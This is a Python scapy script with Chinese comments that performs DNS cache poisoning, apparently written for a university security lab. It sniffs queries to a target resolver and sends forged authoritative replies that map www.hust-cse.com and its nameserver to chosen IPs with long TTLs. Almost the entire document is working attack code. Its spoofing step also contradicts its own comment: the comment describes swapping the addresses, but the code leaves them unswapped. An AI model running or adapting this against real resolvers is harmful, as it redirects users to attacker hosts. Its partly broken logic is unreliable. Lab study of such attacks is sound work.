#!/usr/bin/env python
from scapy.all import *
import time

# 配置参数（根据实验环境调整）
DNS_SERVER_IP = "10.10.27.2"  # 目标DNS服务器IP
ATTACK_IFACE = "br-xxx"       # 攻击者机的网络接口（如br-8xxx）
# 伪造的三条指定记录
TARGET_DOMAIN = "www.hust-cse.com"  # 目标查询域名
A_RECORD_IP = "20.21.9.1"           # A记录指定IP
NS_DOMAIN = "ns.hust-cse.com"       # NS记录域名
NS_A_RECORD_IP = "20.24.4.9"        # 附加部分NS的A记录IP

def spoof_dns_response(pkt):
    # 1. 过滤数据包：仅处理DNS查询、目标DNS服务器、查询域名为TARGET_DOMAIN的包
    if (UDP in pkt and DNS in pkt and 
        pkt[UDP].dport == 53 and  # DNS默认端口
        pkt[IP].dst == DNS_SERVER_IP and  # 发往目标DNS服务器
        TARGET_DOMAIN in pkt[DNS].qd.qname.decode('utf-8')):  # 查询目标域名
        
        # 2. 构造IP层：源IP=DNS服务器的查询目标IP（伪装成权威服务器），目标IP=DNS服务器IP
        # （注：pkt[IP].src是用户机IP，pkt[IP].dst是DNS服务器IP，此处需伪装成"权威服务器"响应DNS服务器）
        ip_layer = IP(dst=pkt[IP].dst, src=pkt[IP].src)  # 交换源目IP，伪装权威服务器响应
        
        # 3. 构造UDP层：源端口=53（DNS权威服务器端口），目标端口=DNS服务器的查询端口
        udp_layer = UDP(dport=pkt[UDP].sport, sport=53)
        
        # 4. 构造DNS记录：严格按要求添加3类记录
        # 4.1 答案部分：A类型记录（www.hust-cse.com → 20.21.9.1）
        ans_section = DNSRR(
            rrname=TARGET_DOMAIN + ".",  # 域名需加". "表示根域，避免解析异常
            type="A",
            ttl=259200,  # 缓存时间（72小时，确保持续影响）
            rdata=A_RECORD_IP
        )
        
        # 4.2 授权部分：NS类型记录（ns.hust-cse.com 是权威服务器）
        ns_section = DNSRR(
            rrname="hust-cse.com.",  # 授权域是hust-cse.com
            type="NS",
            ttl=259200,
            rdata=NS_DOMAIN + "."
        )
        
        # 4.3 附加部分：NS域名的A记录（ns.hust-cse.com → 20.24.4.9）
        ar_section = DNSRR(
            rrname=NS_DOMAIN + ".",
            type="A",
            ttl=259200,
            rdata=NS_A_RECORD_IP
        )
        
        # 5. 构造完整DNS包：确保事务ID、查询域与原查询包一致（DNS协议验证关键）
        dns_layer = DNS(
            id=pkt[DNS].id,  # 事务ID必须与查询包完全一致，否则被丢弃
            qd=pkt[DNS].qd,  # 查询部分与原包一致
            qr=1,            # 1=响应包，0=查询包
            aa=1,            # 1=授权回答（伪装权威服务器）
            rd=0,            # 0=禁用递归
            qdcount=1,       # 查询记录数：1
            ancount=1,       # 答案记录数：1（A记录）
            nscount=1,       # 授权记录数：1（NS记录）
            arcount=1,       # 附加记录数：1（NS的A记录）
            an=ans_section,  # 答案部分
            ns=ns_section,   # 授权部分
            ar=ar_section    # 附加部分
        )
        
        # 6. 组合数据包并发送（verbose=0避免打印冗余信息）
        spoof_pkt = ip_layer / udp_layer / dns_layer
        send(spoof_pkt, iface=ATTACK_IFACE, verbose=0)
        print(f"[+] 已伪造{TARGET_DOMAIN}的响应包，发送至{DNS_SERVER_IP}")

if __name__ == "__main__":
    print(f"[*] 开始监听{DNS_SERVER_IP}的DNS查询（接口：{ATTACK_IFACE}）")
    print(f"[*] 攻击持续运行中，按Ctrl+C停止")
    # 嗅探规则：UDP 53端口、发往目标DNS服务器的数据包
    sniff(
        filter=f"udp port 53 and dst host {DNS_SERVER_IP}",
        prn=spoof_dns_response,
        iface=ATTACK_IFACE,
        store=0  # 不存储数据包，减少内存占用
    )
